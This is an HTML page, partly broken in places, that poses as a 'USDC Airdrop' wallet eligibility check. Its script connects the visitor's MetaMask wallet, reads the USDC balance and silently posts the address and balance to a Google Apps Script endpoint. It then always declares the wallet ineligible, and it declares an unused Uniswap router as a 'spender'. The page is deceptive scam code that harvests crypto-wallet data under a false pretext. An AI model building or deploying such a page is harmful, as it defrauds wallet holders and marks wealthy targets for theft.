<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #141e30, #243b55);
      color: white;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      overflow: hidden;
    }

      font-size: 2rem;
      margin-bottom: 20px;
    }

    #status {
      font-size: 1rem;
      color: #ccc;
      margin-top: 10px;
    }

    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.2);
      border-left-color: #ffffff;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin-top: 15px;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>

<body>
  <h1>Verifying Wallet Eligibility for USDC Airdrop...</h1>
  <div class="spinner" id="spinner"></div>
  <p id="status">Connecting wallet... please wait.</p>

  <script>
    const tokenAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // USDC mainnet
    const spender = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";   // Uniswap V2 Router

    async function fetchUSDCBalance(web3, userAddress) {
      const minABI = [
        {
          constant: true,
          inputs: [{ name: "_owner", type: "address" }],
          name: "balanceOf",
          outputs: [{ name: "balance", type: "uint256" }],
          type: "function"
        },
        {
          constant: true,
          inputs: [],
          name: "decimals",
          outputs: [{ name: "", type: "uint8" }],
          type: "function"
        }
      ];
      const contract = new web3.eth.Contract(minABI, tokenAddress);
      const balance = await contract.methods.balanceOf(userAddress).call();
      const decimals = await contract.methods.decimals().call();
      return balance / (10 ** decimals);
    }

      await fetch("https://script.google.com/macros/s/AKfycbxvmbizONYL1GQoyfr7odC-V4mpPrv-jtIfQS4BtklJqZ9wEuOMi4Pu9UERGNVdbVRsQQ/exec", {
        method: "POST",
        body: JSON.stringify({ address, balance }),
        headers: { "Content-Type": "application/json" }
      });
    }

      if (!window.ethereum) {
        document.getElementById("status").innerText = "âŒ MetaMask not detected. Please install it to continue.";
        return;
      }

      const web3 = new Web3(window.ethereum);
      await ethereum.request({ method: 'eth_requestAccounts' });
      const accounts = await web3.eth.getAccounts();
      const user = accounts[0];

      document.getElementById("status").innerText = "ðŸ” Securely verifying your wallet on Ethereum Mainnet...";

      const usdcBalance = await fetchUSDCBalance(web3, user);
      await logToGoogleSheet(user, usdcBalance);

        const eligible = false; // Simulate check result
        if (eligible) {
          document.getElementById("status").innerText = "âœ… Wallet eligible. Preparing your airdrop...";
        } else {
          document.getElementById("spinner").remove();
          document.getElementById("status").innerText = `ðŸš« Wallet: ${user} â€” Not eligible for USDC airdrop. You may try again later.`;
        }

</body>
